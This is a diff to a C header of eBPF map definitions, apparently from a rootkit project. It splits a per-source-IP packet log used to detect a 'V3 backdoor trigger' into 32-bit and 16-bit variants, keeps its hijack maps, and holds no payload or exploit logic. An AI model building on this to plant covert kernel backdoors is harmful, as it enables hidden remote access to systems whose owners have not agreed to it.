@@ -34,9 +34,14 @@ struct exec_var_hijack_active_data{//Map value
 };
 
 //Map value, contains 3 last packets from an specific IP (the key)
-struct backdoor_packet_log_data{
+struct backdoor_packet_log_data_32{
 	int last_packet_modified;
-	struct trigger_t trigger_array[3];
+	struct trigger_32_t trigger_array[3];
+};
+//Map value, contains 6 last packets from an specific IP (the key)
+struct backdoor_packet_log_data_16{
+	int last_packet_modified;
+	struct trigger_16_t trigger_array[6];
 };
 
 
@@ -55,12 +60,18 @@ struct exec_var_priv_hijack_active{ //Map
 } exec_var_hijack_active SEC(".maps");
 
 //Map to store log of packets received seeking to find a V3 backdoor trigger
-struct backdoor_priv_packet_log{ 
+struct backdoor_priv_packet_log_32{ 
 	__uint(type, BPF_MAP_TYPE_HASH);
 	__uint(max_entries, 1024);
 	__type(key, __u32); //Source IPv4 of packet
-	__type(value, struct backdoor_packet_log_data);
-} backdoor_packet_log SEC(".maps");
+	__type(value, struct backdoor_packet_log_data_32);
+} backdoor_packet_log_32 SEC(".maps");
+struct backdoor_priv_packet_log_16{ 
+	__uint(type, BPF_MAP_TYPE_HASH);
+	__uint(max_entries, 1024);
+	__type(key, __u32); //Source IPv4 of packet
+	__type(value, struct backdoor_packet_log_data_16);
+} backdoor_packet_log_16 SEC(".maps");
 
 
 /*PROTECTED MAPS*/
